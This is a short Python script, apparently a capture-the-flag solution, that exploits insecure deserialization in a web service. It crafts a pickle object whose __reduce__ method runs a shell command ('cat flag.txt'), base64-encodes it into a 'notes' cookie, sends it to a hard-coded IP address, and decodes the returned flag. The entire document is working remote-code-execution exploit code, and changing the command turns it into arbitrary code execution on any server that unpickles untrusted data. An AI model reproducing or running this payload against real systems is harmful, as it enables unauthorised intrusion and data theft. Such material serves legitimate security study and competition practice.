import requests
import pickle
import base64
import subprocess


class PayLoad(object):
    def __reduce__(self):
        return subprocess.check_output, (('cat', 'flag.txt'),)


a = pickle.dumps(PayLoad())
cookie = base64.b64encode(a)

url = "http://62.173.140.174:16040/"
cookies = {"notes": cookie.decode('utf-8')}
req = requests.get(url, cookies=cookies)

data = req.text[500:].replace('<br>', '').replace('</div>', '').replace('</body>', '').replace('</html>', '').split()
flag = ''.join([chr(int(i)) for i in data])

print('Pickle base64 encoded payload:', cookie.decode('utf-8'))
print(f'Flag: {flag}')